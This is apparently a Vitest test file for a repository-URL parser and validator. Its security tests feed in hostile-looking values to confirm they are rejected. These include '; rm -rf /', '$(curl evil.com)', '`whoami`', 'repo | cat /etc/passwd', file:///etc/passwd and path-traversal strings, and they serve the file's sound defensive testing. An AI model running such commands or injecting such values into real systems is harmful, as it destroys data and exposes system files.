import { describe, test, expect } from "vitest";
import {
  isRepoUrl,
  parseRepoUrl,
  validateRepoUrl,
  validateSubpath,
  RepoUrlError,
} from "./repo-url.js";

// === isRepoUrl ===

describe("isRepoUrl", () => {
  test("returns true for GitHub HTTPS URL", () => {
    expect(isRepoUrl("https://github.com/user/repo")).toBe(true);
  });

  test("returns true for GitHub shorthand", () => {
    expect(isRepoUrl("github:user/repo")).toBe(true);
  });

  test("returns true for GitLab URL", () => {
    expect(isRepoUrl("https://gitlab.com/user/repo")).toBe(true);
  });

  test("returns true for Bitbucket URL", () => {
    expect(isRepoUrl("https://bitbucket.org/user/repo")).toBe(true);
  });

  test("returns false for local directory", () => {
    expect(isRepoUrl("./dist")).toBe(false);
  });

  test("returns false for template name", () => {
    expect(isRepoUrl("my-template")).toBe(false);
  });

  test("returns false for absolute path", () => {
    expect(isRepoUrl("/absolute/path")).toBe(false);
  });

  test("returns false for file:// URL", () => {
    expect(isRepoUrl("file:///etc/passwd")).toBe(false);
  });

  test("returns false for git:// URL", () => {
    expect(isRepoUrl("git://github.com/user/repo")).toBe(false);
  });

  test("returns false for unknown host", () => {
    expect(isRepoUrl("https://evil.com/user/repo")).toBe(false);
  });

  test("returns false for empty string", () => {
    expect(isRepoUrl("")).toBe(false);
  });
});

// === parseRepoUrl ===

describe("parseRepoUrl — HTTPS URLs", () => {
  test("parses basic GitHub URL", () => {
    const parsed = parseRepoUrl("https://github.com/lyc8503/UptimeFlare");
    expect(parsed.provider).toBe("github");
    expect(parsed.owner).toBe("lyc8503");
    expect(parsed.repo).toBe("UptimeFlare");
    expect(parsed.branch).toBeNull();
    expect(parsed.cloneUrl).toBe("https://github.com/lyc8503/UptimeFlare.git");
  });

  test("strips .git suffix", () => {
    const parsed = parseRepoUrl("https://github.com/user/repo.git");
    expect(parsed.repo).toBe("repo");
    expect(parsed.cloneUrl).toBe("https://github.com/user/repo.git");
  });

  test("extracts branch from # fragment", () => {
    const parsed = parseRepoUrl("https://github.com/user/repo#develop");
    expect(parsed.branch).toBe("develop");
  });

  test("extracts branch from /tree/branch path", () => {
    const parsed = parseRepoUrl("https://github.com/user/repo/tree/main");
    expect(parsed.branch).toBe("main");
  });

  test("handles nested branch in /tree/ path", () => {
    const parsed = parseRepoUrl("https://github.com/user/repo/tree/feature/auth");
    expect(parsed.branch).toBe("feature/auth");
  });

  test("strips trailing slash", () => {
    const parsed = parseRepoUrl("https://github.com/user/repo/");
    expect(parsed.repo).toBe("repo");
  });

  test("strips query params", () => {
    const parsed = parseRepoUrl("https://github.com/user/repo?tab=code");
    expect(parsed.repo).toBe("repo");
  });

  test("normalizes hostname to lowercase", () => {
    const parsed = parseRepoUrl("https://GitHub.com/User/Repo");
    expect(parsed.provider).toBe("github");
    expect(parsed.owner).toBe("User");
    expect(parsed.repo).toBe("Repo");
  });

  test("parses GitLab URL", () => {
    const parsed = parseRepoUrl("https://gitlab.com/user/repo");
    expect(parsed.provider).toBe("gitlab");
  });

  test("parses Bitbucket URL", () => {
    const parsed = parseRepoUrl("https://bitbucket.org/user/repo");
    expect(parsed.provider).toBe("bitbucket");
  });
});

describe("parseRepoUrl — shorthands", () => {
  test("parses github:owner/repo", () => {
    const parsed = parseRepoUrl("github:user/repo");
    expect(parsed.provider).toBe("github");
    expect(parsed.owner).toBe("user");
    expect(parsed.repo).toBe("repo");
    expect(parsed.branch).toBeNull();
  });

  test("parses github:owner/repo#branch", () => {
    const parsed = parseRepoUrl("github:user/repo#v2");
    expect(parsed.branch).toBe("v2");
  });

  test("parses gitlab:owner/repo", () => {
    const parsed = parseRepoUrl("gitlab:user/repo");
    expect(parsed.provider).toBe("gitlab");
  });

  test("strips .git from shorthand", () => {
    const parsed = parseRepoUrl("github:user/repo.git");
    expect(parsed.repo).toBe("repo");
  });
});

describe("parseRepoUrl — errors", () => {
  test("throws on empty input", () => {
    expect(() => parseRepoUrl("")).toThrow(RepoUrlError);
  });

  test("throws on URL with only owner (no repo)", () => {
    expect(() => parseRepoUrl("https://github.com/user")).toThrow(RepoUrlError);
  });

  test("throws on malformed URL", () => {
    expect(() => parseRepoUrl("not-a-url")).toThrow();
  });

  test("throws on shorthand without repo", () => {
    expect(() => parseRepoUrl("github:user")).toThrow(RepoUrlError);
  });
});

// === validateRepoUrl — SECURITY TESTS ===

describe("validateRepoUrl — protocol attacks", () => {
  test("rejects git:// protocol", () => {
    expect(() =>
      parseRepoUrl("git://github.com/user/repo"),
    ).toThrow(/Only HTTPS/);
  });

  test("rejects ssh:// protocol", () => {
    expect(() =>
      parseRepoUrl("ssh://git@github.com/user/repo"),
    ).toThrow(/Only HTTPS/);
  });

  test("rejects file:// protocol", () => {
    expect(() =>
      parseRepoUrl("file:///etc/passwd"),
    ).toThrow(/Only HTTPS/);
  });

  test("rejects http:// (non-TLS)", () => {
    expect(() =>
      parseRepoUrl("http://github.com/user/repo"),
    ).toThrow(/Only HTTPS/);
  });
});

describe("validateRepoUrl — SSRF prevention", () => {
  test("rejects localhost", () => {
    expect(() =>
      parseRepoUrl("https://localhost/user/repo"),
    ).toThrow(/Unsupported host/);
  });

  test("rejects 127.0.0.1", () => {
    expect(() =>
      parseRepoUrl("https://127.0.0.1/user/repo"),
    ).toThrow(/Unsupported host/);
  });

  test("rejects 10.0.0.1 (private IP)", () => {
    expect(() =>
      parseRepoUrl("https://10.0.0.1/user/repo"),
    ).toThrow(/Unsupported host/);
  });

  test("rejects 192.168.1.1 (private IP)", () => {
    expect(() =>
      parseRepoUrl("https://192.168.1.1/user/repo"),
    ).toThrow(/Unsupported host/);
  });

  test("rejects [::1] (IPv6 loopback)", () => {
    expect(() =>
      parseRepoUrl("https://[::1]/user/repo"),
    ).toThrow(/Unsupported host/);
  });

  test("rejects unknown hostname", () => {
    expect(() =>
      parseRepoUrl("https://evil.com/user/repo"),
    ).toThrow(/Unsupported host/);
  });
});

describe("validateRepoUrl — credential leaks", () => {
  test("rejects URL with embedded token", () => {
    expect(() =>
      parseRepoUrl("https://ghp_token123@github.com/user/repo"),
    ).toThrow(/embedded credentials/);
  });

  test("rejects URL with username:password", () => {
    expect(() =>
      parseRepoUrl("https://user:pass@github.com/user/repo"),
    ).toThrow(/embedded credentials/);
  });
});

describe("validateRepoUrl — command injection", () => {
  test("rejects owner with semicolon", () => {
    const parsed = parseRepoUrl("https://github.com/user/repo");
    parsed.owner = "; rm -rf /";
    expect(() => validateRepoUrl(parsed)).toThrow(/Invalid owner/);
  });

  test("rejects repo with $() substitution", () => {
    const parsed = parseRepoUrl("https://github.com/user/repo");
    parsed.repo = "$(curl evil.com)";
    expect(() => validateRepoUrl(parsed)).toThrow(/Invalid repo/);
  });

  test("rejects repo with backticks", () => {
    const parsed = parseRepoUrl("https://github.com/user/repo");
    parsed.repo = "`whoami`";
    expect(() => validateRepoUrl(parsed)).toThrow(/Invalid repo/);
  });

  test("rejects repo with pipe", () => {
    const parsed = parseRepoUrl("https://github.com/user/repo");
    parsed.repo = "repo | cat /etc/passwd";
    expect(() => validateRepoUrl(parsed)).toThrow(/Invalid repo/);
  });

  test("rejects repo with ampersand", () => {
    const parsed = parseRepoUrl("https://github.com/user/repo");
    parsed.repo = "repo && evil";
    expect(() => validateRepoUrl(parsed)).toThrow(/Invalid repo/);
  });

  test("rejects repo with spaces", () => {
    const parsed = parseRepoUrl("https://github.com/user/repo");
    parsed.repo = "repo with spaces";
    expect(() => validateRepoUrl(parsed)).toThrow(/Invalid repo/);
  });

  test("rejects null bytes", () => {
    const parsed = parseRepoUrl("https://github.com/user/repo");
    parsed.owner = "user\0evil";
    expect(() => validateRepoUrl(parsed)).toThrow(); // Rejected by either name validation or null byte check
  });
});

describe("validateRepoUrl — valid inputs", () => {
  test("accepts standard GitHub repo", () => {
    const parsed = parseRepoUrl("https://github.com/lyc8503/UptimeFlare");
    expect(() => validateRepoUrl(parsed)).not.toThrow();
  });

  test("accepts repo with dots and hyphens", () => {
    const parsed = parseRepoUrl("https://github.com/user/my-repo.js");
    expect(() => validateRepoUrl(parsed)).not.toThrow();
  });

  test("accepts repo with underscores", () => {
    const parsed = parseRepoUrl("https://github.com/user/my_repo");
    expect(() => validateRepoUrl(parsed)).not.toThrow();
  });
});

// === validateSubpath — PATH TRAVERSAL TESTS ===

describe("validateSubpath", () => {
  test("accepts simple path", () => {
    expect(() => validateSubpath("packages/server")).not.toThrow();
  });

  test("accepts single segment", () => {
    expect(() => validateSubpath("src")).not.toThrow();
  });

  test("rejects path traversal", () => {
    expect(() => validateSubpath("../../../etc/passwd")).toThrow(/traversal/);
  });

  test("rejects hidden traversal", () => {
    expect(() => validateSubpath("packages/../../escape")).toThrow(/traversal/);
  });

  test("rejects absolute path", () => {
    expect(() => validateSubpath("/absolute/path")).toThrow(/relative/);
  });

  test("rejects Windows absolute", () => {
    expect(() => validateSubpath("\\windows\\path")).toThrow(/relative/);
  });

  test("rejects empty string", () => {
    expect(() => validateSubpath("")).toThrow(/empty/);
  });

  test("rejects whitespace only", () => {
    expect(() => validateSubpath("   ")).toThrow(/empty/);
  });

  test("rejects null bytes", () => {
    expect(() => validateSubpath("packages/\0evil")).toThrow(/Null bytes/);
  });
});

// === Edge cases ===

describe("edge cases", () => {
  test("displayUrl is human-readable", () => {
    const parsed = parseRepoUrl("https://github.com/user/repo#develop");
    expect(parsed.displayUrl).toBe("user/repo#develop");
  });

  test("displayUrl without branch", () => {
    const parsed = parseRepoUrl("https://github.com/user/repo");
    expect(parsed.displayUrl).toBe("user/repo");
  });

  test("cloneUrl always ends with .git", () => {
    const p1 = parseRepoUrl("https://github.com/user/repo");
    expect(p1.cloneUrl).toMatch(/\.git$/);

    const p2 = parseRepoUrl("github:user/repo");
    expect(p2.cloneUrl).toMatch(/\.git$/);
  });
});
